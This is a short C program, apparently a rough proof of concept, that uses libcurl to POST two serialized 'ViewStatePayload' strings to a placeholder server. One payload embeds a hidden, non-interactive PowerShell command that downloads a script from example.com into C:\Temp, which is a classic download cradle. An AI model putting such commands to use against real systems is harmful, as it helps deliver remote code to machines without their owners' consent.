#include <stdio.h>
#include <string.h>
#include <curl/curl.h>

typedef struct {
    char command[32];
    char user[32];
    char payload[256];
} ViewStatePayload;

void serialize_payload(ViewStatePayload *p, char *out, size_t out_size) {
    snprintf(out, out_size, "[COMMAND=%s][USER=%s][PAYLOAD=%s]",
             p->command, p->user, p->payload);
}

int main() {
    const char *server_url = "http://example.com/receive"; // server adresi
    ViewStatePayload payloads[2];

    strcpy(payloads[0].command, "PING");
    strcpy(payloads[0].user, "9999");
    strcpy(payloads[0].payload, "powershell -NoP -NonI -W Hidden -Command \"Invoke-WebRequest http://example.com/a.ps1 -OutFile C:\\Temp\\a.ps1\"");

    strcpy(payloads[1].command, "CHECK");
    strcpy(payloads[1].user, "8888");
    strcpy(payloads[1].payload, "powershell -NoP -NonI -W Hidden -Command \"Write-Host 'Test'\"");

    CURL *curl = curl_easy_init();
    if (!curl) return 1;

    char serialized[512];
    for (int i = 0; i < 2; i++) {
        serialize_payload(&payloads[i], serialized, sizeof(serialized));

        curl_easy_setopt(curl, CURLOPT_URL, server_url);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, serialized);

        CURLcode res = curl_easy_perform(curl);
        if(res != CURLE_OK)
            fprintf(stderr, "Failed to send payload: %s\n", curl_easy_strerror(res));
        else
            printf("Payload sent to server: %s\n", serialized);
    }

    curl_easy_cleanup(curl);
    return 0;
}
